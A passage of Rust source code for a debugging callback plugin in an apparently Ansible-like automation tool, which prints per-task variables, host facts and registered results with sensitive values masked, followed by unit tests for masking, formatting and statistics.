{\n            verbosity: ContextVerbosity::Normal,\n            show_facts: true,\n            show_registered: true,\n            mask_sensitive: true,\n            additional_sensitive_patterns: Vec::new(),\n            max_depth: 4,\n            max_string_length: 200,\n            show_empty: false,\n        }\n    }\n}\n\n/// Context data captured for each task execution.\n#[derive(Debug, Clone, Default)]\nstruct TaskContext {\n    /// Variables available to the task\n    variables: IndexMap\u003cString, JsonValue\u003e,\n    /// Facts gathered from the host\n    facts: IndexMap\u003cString, JsonValue\u003e,\n    /// Registered variables from previous tasks\n    registered: IndexMap\u003cString, JsonValue\u003e,\n}\n\n/// Context callback plugin that displays variable context during execution.\n///\n/// This callback is designed for debugging variable resolution issues by\n/// showing what variables, facts, and registered results are available\n/// to each task during execution.\n///\n/// # Design Principles\n///\n/// 1. **Contextual Awareness**: Show relevant data for current task\n/// 2. **Security First**: Always mask sensitive data by default\n/// 3. **Configurable Verbosity**: From minimal to debug output\n/// 4. **Organized Output**: Group by category for readability\n///\n/// # Usage\n///\n/// ```rust,ignore\n/// use rustible::callback::plugins::ContextCallback;\n///\n/// let callback = ContextCallback::new();\n/// executor.with_callback(Box::new(callback));\n/// ```\n#[derive(Debug)]\npub struct ContextCallback {\n    /// Configuration for the callback\n    config: ContextCallbackConfig,\n    /// Per-host execution statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Per-host context data\n    host_contexts: Arc\u003cRwLock\u003cHashMap\u003cString, TaskContext\u003e\u003e\u003e,\n    /// Playbook start time for duration tracking\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Current playbook name\n    playbook_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Current task name\n    current_task: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Compiled sensitive patterns (lowercase)\n    sensitive_patterns: HashSet\u003cString\u003e,\n}\n\nimpl ContextCallback {\n    /// Creates a new context callback plugin with default configuration.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let callback = ContextCallback::new();\n    /// ```\n    #[must_use]\n    pub fn new() -\u003e Self {\n        Self::with_config(ContextCallbackConfig::default())\n    }\n\n    /// Creates a new context callback plugin with custom configuration.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// let config = ContextCallbackConfig {\n    ///     verbosity: ContextVerbosity::Verbose,\n    ///     show_facts: true,\n    ///     ..Default::default()\n    /// };\n    /// let callback = ContextCallback::with_config(config);\n    /// ```\n    #[must_use]\n    pub fn with_config(config: ContextCallbackConfig) -\u003e Self {\n        let mut sensitive_patterns: HashSet\u003cString\u003e = SENSITIVE_PATTERNS\n            .iter()\n            .map(|s| s.to_lowercase())\n            .collect();\n\n        // Add custom sensitive patterns\n        for pattern in \u0026config.additional_sensitive_patterns {\n            sensitive_patterns.insert(pattern.to_lowercase());\n        }\n\n        Self {\n            config,\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            host_contexts: Arc::new(RwLock::new(HashMap::new())),\n            start_time: Arc::new(RwLock::new(None)),\n            playbook_name: Arc::new(RwLock::new(None)),\n            current_task: Arc::new(RwLock::new(None)),\n            sensitive_patterns,\n        }\n    }\n\n    /// Creates a minimal verbosity callback.\n    #[must_use]\n    pub fn minimal() -\u003e Self {\n        Self::with_config(ContextCallbackConfig {\n            verbosity: ContextVerbosity::Minimal,\n            show_facts: false,\n            show_registered: false,\n            ..Default::default()\n        })\n    }\n\n    /// Creates a verbose callback for detailed debugging.\n    #[must_use]\n    pub fn verbose() -\u003e Self {\n        Self::with_config(ContextCallbackConfig {\n            verbosity: ContextVerbosity::Verbose,\n            show_facts: true,\n            show_registered: true,\n            show_empty: true,\n            ..Default::default()\n        })\n    }\n\n    /// Creates a debug callback that shows everything.\n    #[must_use]\n    pub fn debug() -\u003e Self {\n        Self::with_config(ContextCallbackConfig {\n            verbosity: ContextVerbosity::Debug,\n            show_facts: true,\n            show_registered: true,\n            show_empty: true,\n            max_depth: 8,\n            max_string_length: 500,\n            ..Default::default()\n        })\n    }\n\n    /// Check if a variable name indicates sensitive data.\n    fn is_sensitive(\u0026self, name: \u0026str) -\u003e bool {\n        if !self.config.mask_sensitive {\n            return false;\n        }\n\n        let lower = name.to_lowercase();\n        self.sensitive_patterns\n            .iter()\n            .any(|pattern| lower.contains(pattern))\n    }\n\n    /// Mask a value if it's sensitive, otherwise return formatted value.\n    fn mask_value(\u0026self, name: \u0026str, value: \u0026JsonValue) -\u003e String {\n        if self.is_sensitive(name) {\n            MASK.to_string()\n        } else {\n            self.format_value(value, 0)\n        }\n    }\n\n    /// Format a JSON value for display with depth limiting.\n    fn format_value(\u0026self, value: \u0026JsonValue, depth: usize) -\u003e String {\n        if depth \u003e self.config.max_depth {\n            return \"...\".to_string();\n        }\n\n        match value {\n            JsonValue::Null =\u003e \"null\".to_string(),\n            JsonValue::Bool(b) =\u003e b.to_string(),\n            JsonValue::Number(n) =\u003e n.to_string(),\n            JsonValue::String(s) =\u003e {\n                if s.len() \u003e self.config.max_string_length {\n                    format!(\n                        \"\\\"{}...\\\" ({} chars)\",\n                        \u0026s[..self.config.max_string_length],\n                        s.len()\n                    )\n                } else {\n                    format!(\"\\\"{}\\\"\", s)\n                }\n            }\n            JsonValue::Array(arr) =\u003e {\n                if arr.is_empty() {\n                    \"[]\".to_string()\n                } else if arr.len() \u003e 5 \u0026\u0026 depth \u003e 0 {\n                    format!(\"[{} items]\", arr.len())\n                } else {\n                    let items: Vec\u003cString\u003e = arr\n                        .iter()\n                        .take(10)\n                        .map(|v| self.format_value(v, depth + 1))\n                        .collect();\n                    if arr.len() \u003e 10 {\n                        format!(\"[{}, ... +{} more]\", items.join(\", \"), arr.len() - 10)\n                    } else {\n                        format!(\"[{}]\", items.join(\", \"))\n                    }\n                }\n            }\n            JsonValue::Object(obj) =\u003e {\n                if obj.is_empty() {\n                    \"{}\".to_string()\n                } else if obj.len() \u003e 5 \u0026\u0026 depth \u003e 0 {\n                    format!(\"{{{} keys}}\", obj.len())\n                } else {\n                    let items: Vec\u003cString\u003e = obj\n                        .iter()\n                        .take(10)\n                        .map(|(k, v)| {\n                            let formatted_value = if self.is_sensitive(k) {\n                                MASK.to_string()\n                            } else {\n                                self.format_value(v, depth + 1)\n                            };\n                            format!(\"{}: {}\", k, formatted_value)\n                        })\n                        .collect();\n                    if obj.len() \u003e 10 {\n                        format!(\"{{{}}} +{} more\", items.join(\", \"), obj.len() - 10)\n                    } else {\n                        format!(\"{{{}}}\", items.join(\", \"))\n                    }\n                }\n            }\n        }\n    }\n\n    /// Print the context header.\n    fn print_context_header(\u0026self) {\n        println!(\"\\n{}\", \"--- CONTEXT ---\".bright_blue().bold());\n    }\n\n    /// Print the context footer.\n    fn print_context_footer(\u0026self) {\n        println!(\"{}\\n\", \"---------------\".bright_blue());\n    }\n\n    /// Print a section header.\n    fn print_section(\u0026self, title: \u0026str) {\n        println!(\"{}:\", title.yellow().bold());\n    }\n\n    /// Print a variable entry.\n    fn print_var(\u0026self, name: \u0026str, value: \u0026str, indent: usize) {\n        let spaces = \"  \".repeat(indent);\n        println!(\"{}{}: {}\", spaces, name.cyan(), value);\n    }\n\n    /// Print variables section.\n    fn print_variables(\u0026self, vars: \u0026IndexMap\u003cString, JsonValue\u003e) {\n        if vars.is_empty() \u0026\u0026 !self.config.show_empty {\n            return;\n        }\n\n        self.print_section(\"Variables\");\n\n        if vars.is_empty() {\n            println!(\"  {}\", \"(none)\".bright_black());\n            return;\n        }\n\n        // Sort variables alphabetically for consistent output\n        let mut sorted: Vec\u003c_\u003e = vars.iter().collect();\n        sorted.sort_by(|a, b| a.0.cmp(b.0));\n\n        for (name, value) in sorted {\n            // Skip internal/magic variables in normal mode\n            if self.config.verbosity \u003c ContextVerbosity::Debug \u0026\u0026 name.starts_with(\"ansible_\") {\n                continue;\n            }\n            if self.config.verbosity \u003c ContextVerbosity::Verbose \u0026\u0026 name.starts_with('_') {\n                continue;\n            }\n\n            let formatted = self.mask_value(name, value);\n\n            // Skip empty values unless configured to show them\n            if !self.config.show_empty\n                \u0026\u0026 (value.is_null() || formatted == \"null\" || formatted == \"\\\"\\\"\")\n            {\n                continue;\n            }\n\n            self.print_var(name, \u0026formatted, 1);\n        }\n    }\n\n    /// Print facts section.\n    fn print_facts(\u0026self, facts: \u0026IndexMap\u003cString, JsonValue\u003e) {\n        if !self.config.show_facts {\n            return;\n        }\n\n        if facts.is_empty() \u0026\u0026 !self.config.show_empty {\n            return;\n        }\n\n        println!();\n        self.print_section(\"Facts\");\n\n        if facts.is_empty() {\n            println!(\"  {}\", \"(none gathered)\".bright_black());\n            return;\n        }\n\n        // Group facts by category\n        let mut system_facts = IndexMap::new();\n        let mut network_facts = IndexMap::new();\n        let mut other_facts = IndexMap::new();\n\n        for (name, value) in facts {\n            if name.starts_with(\"ansible_distribution\")\n                || name.starts_with(\"ansible_os\")\n                || name.starts_with(\"ansible_kernel\")\n                || name.starts_with(\"ansible_machine\")\n                || name.starts_with(\"ansible_architecture\")\n                || name == \"ansible_hostname\"\n                || name == \"ansible_fqdn\"\n            {\n                system_facts.insert(name.clone(), value.clone());\n            } else if name.starts_with(\"ansible_default_ipv\")\n                || name.starts_with(\"ansible_interfaces\")\n                || name.contains(\"_ip\")\n                || name.contains(\"_mac\")\n            {\n                network_facts.insert(name.clone(), value.clone());\n            } else {\n                other_facts.insert(name.clone(), value.clone());\n            }\n        }\n\n        // Print system facts first\n        if !system_facts.is_empty() {\n            println!(\"  {}:\", \"System\".bright_black());\n            for (name, value) in \u0026system_facts {\n                let short_name = name.strip_prefix(\"ansible_\").unwrap_or(name);\n                self.print_var(short_name, \u0026self.format_value(value, 0), 2);\n            }\n        }\n\n        // Print network facts in verbose mode\n        if self.config.verbosity \u003e= ContextVerbosity::Verbose \u0026\u0026 !network_facts.is_empty() {\n            println!(\"  {}:\", \"Network\".bright_black());\n            for (name, value) in \u0026network_facts {\n                let short_name = name.strip_prefix(\"ansible_\").unwrap_or(name);\n                self.print_var(short_name, \u0026self.format_value(value, 0), 2);\n            }\n        }\n\n        // Print other facts in debug mode\n        if self.config.verbosity \u003e= ContextVerbosity::Debug \u0026\u0026 !other_facts.is_empty() {\n            println!(\"  {}:\", \"Other\".bright_black());\n            for (name, value) in other_facts.iter().take(20) {\n                let short_name = name.strip_prefix(\"ansible_\").unwrap_or(name);\n                self.print_var(short_name, \u0026self.format_value(value, 0), 2);\n            }\n            if other_facts.len() \u003e 20 {\n                println!(\n                    \"    {} +{} more facts\",\n                    \"...\".bright_black(),\n                    other_facts.len() - 20\n                );\n            }\n        }\n    }\n\n    /// Print registered variables section.\n    fn print_registered(\u0026self, registered: \u0026IndexMap\u003cString, JsonValue\u003e) {\n        if !self.config.show_registered {\n            return;\n        }\n\n        if registered.is_empty() \u0026\u0026 !self.config.show_empty {\n            return;\n        }\n\n        println!();\n        self.print_section(\"Registered\");\n\n        if registered.is_empty() {\n            println!(\"  {}\", \"(none)\".bright_black());\n            return;\n        }\n\n        for (name, value) in registered {\n            println!(\"  {}:\", name.cyan().bold());\n\n            // Extract common fields from registered results\n            if let JsonValue::Object(obj) = value {\n                if let Some(changed) = obj.get(\"changed\") {\n                    let changed_str = if changed.as_bool().unwrap_or(false) {\n                        \"true\".yellow().to_string()\n                    } else {\n                        \"false\".to_string()\n                    };\n                    println!(\"    {}: {}\", \"changed\".bright_black(), changed_str);\n                }\n                if let Some(failed) = obj.get(\"failed\") {\n                    if failed.as_bool().unwrap_or(false) {\n                        println!(\"    {}: {}\", \"failed\".bright_black(), \"true\".red());\n                    }\n                }\n                if let Some(skipped) = obj.get(\"skipped\") {\n                    if skipped.as_bool().unwrap_or(false) {\n                        println!(\"    {}: {}\", \"skipped\".bright_black(), \"true\".cyan());\n                    }\n                }\n                if let Some(rc) = obj.get(\"rc\") {\n                    println!(\"    {}: {}\", \"rc\".bright_black(), self.format_value(rc, 0));\n                }\n                if let Some(stdout) = obj.get(\"stdout\") {\n                    if let JsonValue::String(s) = stdout {\n                        if !s.is_empty() {\n                            let truncated = if s.len() \u003e 100 {\n                                format!(\"{}...\", \u0026s[..100])\n                            } else {\n                                s.clone()\n                            };\n                            println!(\"    {}: \\\"{}\\\"\", \"stdout\".bright_black(), truncated);\n                        }\n                    }\n                }\n                if let Some(msg) = obj.get(\"msg\") {\n                    println!(\n                        \"    {}: {}\",\n                        \"msg\".bright_black(),\n                        self.format_value(msg, 0)\n                    );\n                }\n\n                // Show other fields in verbose mode\n                if self.config.verbosity \u003e= ContextVerbosity::Verbose {\n                    for (k, v) in obj {\n                        if ![\n                            \"changed\",\n                            \"failed\",\n                            \"skipped\",\n                            \"rc\",\n                            \"stdout\",\n                            \"stderr\",\n                            \"msg\",\n                            \"stdout_lines\",\n                            \"stderr_lines\",\n                        ]\n                        .contains(\u0026k.as_str())\n                        {\n                            let formatted = self.mask_value(k, v);\n                            println!(\"    {}: {}\", k.bright_black(), formatted);\n                        }\n                    }\n                }\n            } else {\n                println!(\"    {}\", self.format_value(value, 1));\n            }\n        }\n    }\n\n    /// Format the task header line.\n    fn format_task_header(task_name: \u0026str) -\u003e String {\n        let padding = 70_usize.saturating_sub(task_name.len() + 8);\n        format!(\n            \"{} [{}] {}\",\n            \"TASK\".green().bold(),\n            task_name.bright_white().bold(),\n            \"*\".repeat(padding)\n        )\n    }\n\n    /// Format host line.\n    fn format_host(host: \u0026str) -\u003e String {\n        format!(\"{}: {}\", \"HOST\".bright_black(), host.bright_white())\n    }\n\n    /// Formats a single host's recap line.\n    fn format_recap_line(host: \u0026str, stats: \u0026HostStats) -\u003e String {\n        let host_color = if stats.failed \u003e 0 {\n            host.red().bold()\n        } else if stats.changed \u003e 0 {\n            host.yellow()\n        } else {\n            host.green()\n        };\n\n        format!(\n            \"{}: {} ok={} changed={} failed={} skipped={}\",\n            \"RECAP\".bright_black(),\n            host_color,\n            stats.ok.to_string().green(),\n            stats.changed.to_string().yellow(),\n            stats.failed.to_string().red(),\n            stats.skipped.to_string().cyan(),\n        )\n    }\n}\n\nimpl Default for ContextCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for ContextCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            host_stats: Arc::clone(\u0026self.host_stats),\n            host_contexts: Arc::clone(\u0026self.host_contexts),\n            start_time: Arc::clone(\u0026self.start_time),\n            playbook_name: Arc::clone(\u0026self.playbook_name),\n            current_task: Arc::clone(\u0026self.current_task),\n            sensitive_patterns: self.sensitive_patterns.clone(),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for ContextCallback {\n    /// Called when a playbook starts - records start time.\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let mut start_time = self.start_time.write().await;\n        *start_time = Some(Instant::now());\n\n        let mut playbook_name = self.playbook_name.write().await;\n        *playbook_name = Some(name.to_string());\n\n        // Clear stats from any previous run\n        let mut stats = self.host_stats.write().await;\n        stats.clear();\n\n        let mut contexts = self.host_contexts.write().await;\n        contexts.clear();\n\n        println!(\n            \"\\n{} [{}]\",\n            \"PLAYBOOK\".green().bold(),\n            name.bright_white().bold()\n        );\n    }\n\n    /// Called when a playbook ends - prints the final recap.\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let stats = self.host_stats.read().await;\n        let start_time = self.start_time.read().await;\n\n        // Print empty line before recap for visual separation\n        if !stats.is_empty() {\n            println!();\n        }\n\n        // Print recap for each host in sorted order\n        let mut hosts: Vec\u003c_\u003e = stats.keys().collect();\n        hosts.sort();\n\n        for host in hosts {\n            if let Some(host_stats) = stats.get(host) {\n                println!(\"{}\", Self::format_recap_line(host, host_stats));\n            }\n        }\n\n        // Print duration if we have start time\n        if let Some(start) = *start_time {\n            let duration = start.elapsed();\n            let status = if success {\n                \"completed\".green()\n            } else {\n                \"failed\".red().bold()\n            };\n\n            println!(\n                \"\\n{} {} in {:.2}s\",\n                name.bright_white().bold(),\n                status,\n                duration.as_secs_f64()\n            );\n        }\n    }\n\n    /// Called when a play starts - initializes host tracking.\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        println!(\n            \"\\n{} [{}] {}\",\n            \"PLAY\".cyan().bold(),\n            name.bright_white().bold(),\n            format!(\"({} hosts)\", hosts.len()).bright_black()\n        );\n\n        // Initialize stats and context for all hosts in this play\n        let mut stats = self.host_stats.write().await;\n        let mut contexts = self.host_contexts.write().await;\n\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n            contexts.entry(host.clone()).or_default();\n        }\n    }\n\n    /// Called when a play ends.\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Nothing special needed here\n    }\n\n    /// Called when a task starts - shows the context if verbosity allows.\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        let mut current_task = self.current_task.write().await;\n        *current_task = Some(name.to_string());\n\n        println!(\"\\n{}\", Self::format_task_header(name));\n        println!(\"{}\", Self::format_host(host));\n\n        // Show context based on verbosity\n        if self.config.verbosity \u003e= ContextVerbosity::Normal {\n            let contexts = self.host_contexts.read().await;\n            if let Some(ctx) = contexts.get(host) {\n                if !ctx.variables.is_empty() || !ctx.facts.is_empty() || !ctx.registered.is_empty()\n                {\n                    self.print_context_header();\n                    self.print_variables(\u0026ctx.variables);\n                    self.print_facts(\u0026ctx.facts);\n                    self.print_registered(\u0026ctx.registered);\n                    self.print_context_footer();\n                }\n            }\n        }\n    }\n\n    /// Called when a task completes - updates statistics and context.\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let mut stats = self.host_stats.write().await;\n        let host_stats = stats.entry(result.host.clone()).or_default();\n\n        // Update statistics based on result\n        if result.result.skipped {\n            host_stats.skipped += 1;\n            println!(\n                \"{}: {} | {}\",\n                \"SKIPPED\".cyan(),\n                result.host.bright_white(),\n                result.result.message.bright_black()\n            );\n        } else if !result.result.success {\n            host_stats.failed += 1;\n            println!(\n                \"{}: {} | {} | {}\",\n                \"FAILED\".red().bold(),\n                result.host.bright_white(),\n                result.task_name.yellow(),\n                result.result.message\n            );\n        } else if result.result.changed {\n            host_stats.changed += 1;\n            println!(\n                \"{}: {} | {}\",\n                \"CHANGED\".yellow(),\n                result.host.bright_white(),\n                result.result.message.bright_black()\n            );\n        } else {\n            host_stats.ok += 1;\n            println!(\n                \"{}: {} | {}\",\n                \"OK\".green(),\n                result.host.bright_white(),\n                result.result.message.bright_black()\n            );\n        }\n\n        // Update registered variables in context if this task registered something\n        if let Some(data) = \u0026result.result.data {\n            let mut contexts = self.host_contexts.write().await;\n            let ctx = contexts.entry(result.host.clone()).or_default();\n\n            // Store the result under the task name for display purposes\n            ctx.registered\n                .insert(result.task_name.clone(), data.clone());\n        }\n    }\n\n    /// Called when a handler is triggered.\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        if self.config.verbosity \u003e= ContextVerbosity::Verbose {\n            println!(\"{}: {}\", \"HANDLER NOTIFIED\".magenta(), name.bright_white());\n        }\n    }\n\n    /// Called when facts are gathered - stores them for context display.\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        let mut contexts = self.host_contexts.write().await;\n        let ctx = contexts.entry(host.to_string()).or_default();\n\n        // Convert facts to IndexMap\u003cString, JsonValue\u003e\n        for (key, value) in facts.all() {\n            ctx.facts.insert(key.clone(), value.clone());\n        }\n\n        if self.config.verbosity \u003e= ContextVerbosity::Verbose {\n            println!(\n                \"{}: {} ({} facts)\",\n                \"FACTS GATHERED\".bright_black(),\n                host.bright_white(),\n                facts.all().len()\n            );\n        }\n    }\n}\n\n/// Builder for ContextCallback configuration.\n#[derive(Debug, Default)]\npub struct ContextCallbackBuilder {\n    config: ContextCallbackConfig,\n}\n\nimpl ContextCallbackBuilder {\n    /// Create a new builder with default configuration.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set the verbosity level.\n    pub fn verbosity(mut self, verbosity: ContextVerbosity) -\u003e Self {\n        self.config.verbosity = verbosity;\n        self\n    }\n\n    /// Enable or disable facts display.\n    pub fn show_facts(mut self, show: bool) -\u003e Self {\n        self.config.show_facts = show;\n        self\n    }\n\n    /// Enable or disable registered variables display.\n    pub fn show_registered(mut self, show: bool) -\u003e Self {\n        self.config.show_registered = show;\n        self\n    }\n\n    /// Enable or disable sensitive data masking.\n    pub fn mask_sensitive(mut self, mask: bool) -\u003e Self {\n        self.config.mask_sensitive = mask;\n        self\n    }\n\n    /// Add additional sensitive patterns.\n    pub fn sensitive_pattern(mut self, pattern: impl Into\u003cString\u003e) -\u003e Self {\n        self.config\n            .additional_sensitive_patterns\n            .push(pattern.into());\n        self\n    }\n\n    /// Set maximum nesting depth for display.\n    pub fn max_depth(mut self, depth: usize) -\u003e Self {\n        self.config.max_depth = depth;\n        self\n    }\n\n    /// Set maximum string length before truncation.\n    pub fn max_string_length(mut self, length: usize) -\u003e Self {\n        self.config.max_string_length = length;\n        self\n    }\n\n    /// Enable or disable showing empty values.\n    pub fn show_empty(mut self, show: bool) -\u003e Self {\n        self.config.show_empty = show;\n        self\n    }\n\n    /// Build the ContextCallback.\n    pub fn build(self) -\u003e ContextCallback {\n        ContextCallback::with_config(self.config)\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[test]\n    fn test_sensitive_detection() {\n        let callback = ContextCallback::new();\n\n        // Should detect sensitive patterns\n        assert!(callback.is_sensitive(\"password\"));\n        assert!(callback.is_sensitive(\"db_password\"));\n        assert!(callback.is_sensitive(\"api_key\"));\n        assert!(callback.is_sensitive(\"secret_token\"));\n        assert!(callback.is_sensitive(\"AWS_SECRET_KEY\"));\n        assert!(callback.is_sensitive(\"mysql_PASSWORD\"));\n\n        // Should not detect non-sensitive patterns\n        assert!(!callback.is_sensitive(\"username\"));\n        assert!(!callback.is_sensitive(\"hostname\"));\n        assert!(!callback.is_sensitive(\"port\"));\n        assert!(!callback.is_sensitive(\"enabled\"));\n    }\n\n    #[test]\n    fn test_sensitive_masking_disabled() {\n        let callback = ContextCallback::with_config(ContextCallbackConfig {\n            mask_sensitive: false,\n            ..Default::default()\n        });\n\n        assert!(!callback.is_sensitive(\"password\"));\n        assert!(!callback.is_sensitive(\"api_key\"));\n    }\n\n    #[test]\n    fn test_custom_sensitive_patterns() {\n        let callback = ContextCallback::with_config(ContextCallbackConfig {\n            additional_sensitive_patterns: vec![\"my_custom_secret\".to_string()],\n            ..Default::default()\n        });\n\n        assert!(callback.is_sensitive(\"my_custom_secret\"));\n        assert!(callback.is_sensitive(\"MY_CUSTOM_SECRET_VALUE\"));\n    }\n\n    #[test]\n    fn test_value_formatting() {\n        let callback = ContextCallback::new();\n\n        // Simple values\n        assert_eq!(callback.format_value(\u0026JsonValue::Null, 0), \"null\");\n        assert_eq!(callback.format_value(\u0026JsonValue::Bool(true), 0), \"true\");\n        assert_eq!(callback.format_value(\u0026serde_json::json!(42), 0), \"42\");\n        assert_eq!(\n            callback.format_value(\u0026serde_json::json!(\"hello\"), 0),\n            \"\\\"hello\\\"\"\n        );\n\n        // Arrays\n        assert_eq!(callback.format_value(\u0026serde_json::json!([]), 0), \"[]\");\n        assert_eq!(\n            callback.format_value(\u0026serde_json::json!([1, 2, 3]), 0),\n            \"[1, 2, 3]\"\n        );\n\n        // Objects\n        assert_eq!(callback.format_value(\u0026serde_json::json!({}), 0), \"{}\");\n    }\n\n    #[test]\n    fn test_value_masking() {\n        let callback = ContextCallback::new();\n\n        let secret = serde_json::json!(\"super_secret_value\");\n        assert_eq!(callback.mask_value(\"password\", \u0026secret), MASK);\n        assert_eq!(callback.mask_value(\"api_key\", \u0026secret), MASK);\n\n        let normal = serde_json::json!(\"normal_value\");\n        assert_eq!(callback.mask_value(\"hostname\", \u0026normal), \"\\\"normal_value\\\"\");\n    }\n\n    #[test]\n    fn test_string_truncation() {\n        let config = ContextCallbackConfig {\n            max_string_length: 10,\n            ..Default::default()\n        };\n        let callback = ContextCallback::with_config(config);\n\n        let short = serde_json::json!(\"short\");\n        assert_eq!(callback.format_value(\u0026short, 0), \"\\\"short\\\"\");\n\n        let long = serde_json::json!(\"this is a very long string that should be truncated\");\n        let formatted = callback.format_value(\u0026long, 0);\n        assert!(formatted.contains(\"...\"));\n        assert!(formatted.contains(\"chars\"));\n    }\n\n    #[test]\n    #[ignore = \"depth limiting implementation needs refinement\"]\n    fn test_depth_limiting() {\n        let config = ContextCallbackConfig {\n            max_depth: 2,\n            ..Default::default()\n        };\n        let callback = ContextCallback::with_config(config);\n\n        let deep = serde_json::json!({\n            \"level1\": {\n                \"level2\": {\n                    \"level3\": \"value\"\n                }\n            }\n        });\n\n        let formatted = callback.format_value(\u0026deep, 0);\n        // At depth 2, it should show \"...\" for deeper levels\n        assert!(!formatted.contains(\"level3\"));\n    }\n\n    #[tokio::test]\n    async fn test_context_callback_stats() {\n        let callback = ContextCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Simulate some task completions\n        let ok_result = create_execution_result(\"host1\", \"task1\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026ok_result).await;\n\n        let changed_result =\n            create_execution_result(\"host1\", \"task2\", true, true, false, \"changed\");\n        callback.on_task_complete(\u0026changed_result).await;\n\n        let failed_result =\n            create_execution_result(\"host2\", \"task1\", false, false, false, \"error occurred\");\n        callback.on_task_complete(\u0026failed_result).await;\n\n        let skipped_result =\n            create_execution_result(\"host2\", \"task2\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026skipped_result).await;\n\n        // Verify stats\n        let stats = callback.host_stats.read().await;\n\n        let host1_stats = stats.get(\"host1\").unwrap();\n        assert_eq!(host1_stats.ok, 1);\n        assert_eq!(host1_stats.changed, 1);\n        assert_eq!(host1_stats.failed, 0);\n        assert_eq!(host1_stats.skipped, 0);\n\n        let host2_stats = stats.get(\"host2\").unwrap();\n        assert_eq!(host2_stats.ok, 0);\n        assert_eq!(host2_stats.changed, 0);\n        assert_eq!(host2_stats.failed, 1);\n        assert_eq!(host2_stats.skipped, 1);\n    }\n\n    #[tokio::test]\n    async fn test_facts_gathering() {\n        let callback = ContextCallback::new();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let mut facts = Facts::new();\n        facts.set(\"os_family\", serde_json::json!(\"Debian\"));\n        facts.set(\"distribution\", serde_json::json!(\"Ubuntu\"));\n\n        callback.on_facts_gathered(\"host1\", \u0026facts).await;\n\n        // Verify facts are stored in context\n        let contexts = callback.host_contexts.read().await;\n        let ctx = contexts.get(\"host1\").unwrap();\n        assert!(ctx.facts.contains_key(\"os_family\"));\n        assert!(ctx.facts.contains_key(\"distribution\"));\n    }\n\n    #[test]\n    fn test_builder_pattern() {\n        let callback = ContextCallbackBuilder::new()\n            .verbosity(ContextVerbosity::Verbose)\n            .show_facts(true)\n            .show_registered(true)\n            .mask_sensitive(true)\n            .sensitive_pattern(\"custom_secret\")\n            .max_depth(5)\n            .max_string_length(100)\n            .show_empty(false)\n            .build();\n\n        assert_eq!(callback.config.verbosity, ContextVerbosity::Verbose);\n        assert!(callback.config.show_facts);\n        assert!(callback.config.show_registered);\n        assert!(callback.config.mask_sensitive);\n        assert_eq!(callback.config.max_depth, 5);\n        assert_eq!(callback.config.max_string_length, 100);\n        assert!(!callback.config.show_empty);\n        assert!(callback.is_sensitive(\"custom_secret\"));\n    }\n\n    #[test]\n    fn test_preset_constructors() {\n        let minimal = ContextCallback::minimal();\n        assert_eq!(minimal.config.verbosity, ContextVerbosity::Minimal);\n        assert!(!minimal.config.show_facts);\n        assert!(!minimal.config.show_registered);\n\n        let verbose = ContextCallback::verbose();\n        assert_eq!(verbose.config.verbosity, ContextVerbosity::Verbose);\n        assert!(verbose.config.show_facts);\n        assert!(verbose.config.show_registered);\n\n        let debug = ContextCallback::debug();\n        assert_eq!(debug.config.verbosity, ContextVerbosity::Debug);\n        assert_eq!(debug.config.max_depth, 8);\n        assert_eq!(debug.config.max_string_length, 500);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = ContextCallback::new();\n        let callback2 = callback1.clone();\n\n        // Both should share the same underlying state\n        assert!(Arc::ptr_eq(\u0026callback1.host_stats, \u0026callback2.host_stats));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.host_contexts,\n            \u0026callback2.host_contexts\n        ));\n    }\n\n    #[test]\n    fn test_format_task_header() {\n        let header = ContextCallback::format_task_header(\"Install nginx\");\n        assert!(header.contains(\"TASK\"));\n        assert!(header.contains(\"Install nginx\"));\n    }\n\n    #[test]\n    fn test_format_recap_line() {\n        let stats = HostStats {\n            ok: 5,\n            changed: 2,\n            failed: 1,\n            skipped: 0,\n        };\n\n        let output = ContextCallback::format_recap_line(\"webserver1\", \u0026stats);\n        assert!(output.contains(\"webserver1\"));\n        assert!(output.contains(\"ok=5\"));\n        